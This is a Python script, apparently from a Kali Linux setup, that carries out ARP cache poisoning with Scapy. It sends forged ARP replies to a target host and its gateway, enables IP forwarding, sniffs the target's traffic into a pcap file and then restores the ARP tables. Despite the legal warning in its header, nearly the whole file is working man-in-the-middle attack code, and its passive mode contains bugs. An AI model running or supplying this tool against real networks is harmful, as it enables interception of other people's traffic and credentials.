#!/home/kali/cyber-attack-test/env/bin/python
'''
WARNING: 
Unauthorized network interference violates:
- 18 U.S. Code § 1030 (CFAA)
- Computer Misuse Act 1990 (UK)
- 刑法第285条 (中国大陆)
- 仅限授权测试使用！攻击他人网络将面临刑事指控。
- No script kiddies allowed! 
'''
from multiprocessing import Process, Event
from ipaddress import ip_address
from scapy.all import ARP, Ether, conf, sendp, sniff, srp, wrpcap # type: ignore
from datetime import datetime
from time import sleep
import argparse
import signal
import sys
import os


def get_mac(target_ip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=target_ip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None

class Arper:
    def __init__(self, target: str, gateway: str, interface:str, count: int = 200, delay=2, autorestore: bool = True, active=True):
        '''
        :param target: Target IPv4 address
        :param gateway: Gateway IPv4 address
        :param interface: Selected network interface
        :param count: Number of packets to sniff, default is 200
        :param autorestore: Whether to restore ARP table automatically, default is True
        '''
        try:
            addr1, addr2 = ip_address(target), ip_address(gateway)
            if (addr1.version != 4) or (addr2.version != 4):
                sys.exit('ARP cache poisoning is ineffective against IPv6')
        except Exception as e:
            sys.exit(f'Invalid input: {e}')
        self.autorestore = autorestore
        self.target = target
        self.target_mac = get_mac(self.target)
        if self.target_mac is None:
            sys.exit('Target not found')
        self.gateway = gateway
        self.gateway_mac = get_mac(gateway)
        self.count = count
        self.interface = interface
        self.delay = delay
        self.active = active
        self.poison_event = Event()
        self.sniff_process: Process
        conf.iface = interface
        conf.verb = 0

        print(f'Initialised {interface}: ')
        print(f'Gateway ({gateway}) is at {self.gateway_mac}. ')
        print(f'Target ({target}) is at {self.target_mac}')
        print('-' * 30)

    def run(self):
        with Forward():
            attacker = ActiveAttacker() if self.active else PassiveAttacker()
            attacker = ActiveAttacker()    # passive strategy temporarily unavailable
            attacker.start(self)
        return self.target_mac

            
class ActiveAttacker:
    
    def poison(self, arper: Arper, event: Event):
        ether1 = Ether(dst=arper.target_mac)
        arp1 = ARP(op=2, psrc=arper.gateway, pdst=arper.target, hwdst=arper.target_mac)
        poison_target = ether1 / arp1

        print(f'IP src: {poison_target[ARP].psrc}')
        print(f'IP dst: {poison_target[ARP].pdst}')
        print(f'MAC src: {poison_target[Ether].src}')
        print(f'MAC dst: {poison_target[Ether].dst}')
        print(poison_target.summary())
        print('-' * 30)

        ether2 = Ether(dst=arper.gateway_mac)
        arp2 = ARP(op=2, psrc=arper.target, pdst=arper.gateway, hwdst=arper.gateway_mac)
        poison_gateway = ether2 / arp2
        
        print(f'IP src: {poison_gateway[ARP].psrc}')
        print(f'IP dst: {poison_gateway[ARP].pdst}')
        print(f'MAC dst: {poison_gateway[Ether].dst}')
        print(f'MAC src: {poison_gateway[Ether].src}')
        print(poison_gateway.summary())
        print('-' * 30)
        print('Beginning the ARP poison. [CTRL-C to stop]')
        signal.signal(signal.SIGINT, signal.SIG_DFL)
        while not event.is_set():
            sys.stdout.write('.')
            sys.stdout.flush()
            sendp(poison_target)
            sendp(poison_gateway)
            event.wait(arper.delay)

    def sniff_and_store(self, arper: Arper):
        print(f'Sniffing {arper.count} packets')
        bpf_filter = f'host {arper.target} and not arp'
        signal.signal(signal.SIGINT, handle_sigint)
        packets = sniff(count=arper.count, filter=bpf_filter, iface=arper.interface)    # The sniff function can handle KeyboardInterrupt
        arper.poison_event.set()
        wrpcap(f"arper_{arper.target}_{datetime.now().strftime('%Y%m%d-%H%M%S')}.pcap", packets)
        print(f'Got {len(packets)} packets')

    def restore(self, arper: Arper):
        '''
        Automatically restore the ARP table after the attack ends 
        or the attack is cancelled
        '''
        if arper.autorestore:
            print('Restoring ARP tables...')
            sendp(
                Ether(src=arper.gateway_mac, 
                      dst=arper.target_mac) / 
                ARP(
                    op=2, 
                    psrc=arper.gateway, 
                    hwsrc=arper.gateway_mac, 
                    pdst=arper.target, 
                    hwdst=arper.target_mac, 
                    ), 
                count=5
                )
            sendp(
                Ether(src=arper.target_mac, 
                      dst=arper.gateway_mac) / 
                ARP(
                    op=2, 
                    psrc=arper.target, 
                    hwsrc=arper.target_mac, 
                    pdst=arper.gateway, 
                    hwdst=arper.gateway_mac
                    ), 
                count=5)
    
    def start(self, arper:Arper):
        try:
            arper.sniff_process = Process(target=self.sniff_and_store, args=[arper])
            arper.sniff_process.start()
            sleep(1)
            poison_process = Process(target=self.poison, args=[arper, arper.poison_event])
            poison_process.start()
            arper.sniff_process.join()
        except (KeyboardInterrupt, Exception) as e:
            with NoInterrupt():
                if isinstance(e, KeyboardInterrupt):
                    print('Aborted')
        else:
            with NoInterrupt():
                arper.poison_event.set()
                poison_process.join()
        finally:
            with NoInterrupt():
                self.restore(arper)
            

class PassiveAttacker:

    def poison(self, arper: Arper):
        ether1 = Ether(dst=arper.target_mac)
        arp1 = ARP(op=2, psrc=arper.gateway, pdst=arper.target, hwdst=arper.target_mac)
        poison_target = ether1 / arp1
        ether2 = Ether(dst=arper.gateway_mac)
        arp2 = ARP(op=2, psrc=arper.target, pdst=arper.gateway, hwdst=arper.gateway_mac)
        poison_gateway = ether2 / arp2
        packet = (poison_gateway, poison_target)
        sniff(filter=f'host {arper.target} and arp', prn=sendp(packet), store=0)

    def sniff_and_store(self, arper: Arper):
        print(f'Sniffing {arper.count} packets')
        bpf_filter = f'host {arper.target} and not arp'
        packets = sniff(count=arper.count, filter=bpf_filter, iface=arper.interface)
        if len(packets) == 0:
            print('Aborted')
        arper.poison_event.set()
        wrpcap(f"arper_{arper.target}_{datetime.now().strftime('%Y%m%d-%H%M%S')}.pcap", packets)
        print(f'Got {len(packets)} packets')

    def start(self, arper: Arper):
        try:
            arper.sniff_process = Process(target=self.sniff_and_store)
            arper.sniff_process.start()
            sleep(1)
            poison_process = Process(target=self.poison)
            poison_process.start()
        except KeyboardInterrupt:   # Aborted
            arper.poison_event.set()
        finally:
            arper.sniff_process.join()
            try:
                poison_process.join()   # The process may not have started up
            except:
                pass

def handle_sigint(signum, frame):
    raise KeyboardInterrupt

class Interrupt:
    def __enter__(self, interrupt: bool):
        if interrupt:
            pass

class NoInterrupt:
    """
    Prevent users from repeatedly triggering KeyboardInterrupt, 
    ensuring crucial operations proceed smoothly
    """
    def __enter__(self):
        signal.signal(signal.SIGINT, signal.SIG_IGN)
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        signal.signal(signal.SIGINT, signal.SIG_DFL)

class Forward:
    def __enter__(self):
        with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
            self.original_value = f.read().strip()
        if self.original_value != '1':
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('1\n')
        return self
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        if self.original_value != '1':
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write(self.original_value + '\n')


if __name__ == '__main__':
    '''main execution flow'''
    if os.getuid() != 0:
        print('Run it as root.')
        exit(1)
    parser = argparse.ArgumentParser(description='Perform ARP spoofing on the target machine')
    parser.add_argument('target',  help='IPv4 address of target machine')
    parser.add_argument('-g', '--g', metavar='gateway', required=True, help='IPv4 addr of gateway', dest='gateway')
    parser.add_argument('-i', '--i', metavar='interface', help='network interface', default='wlan0')
    parser.add_argument('-n', '--n', help='DO NOT restore ARP tables automatically\nBy default it will restore ARP tables before quitting', action='store_false')
    parser.add_argument('-num', '--num', type=int, metavar='number', help='number of packets to sniff', default=200)
    args = parser.parse_args()

    myarp = Arper(args.target, args.gateway, args.i, args.num, autorestore=args.n)
    myarp.run()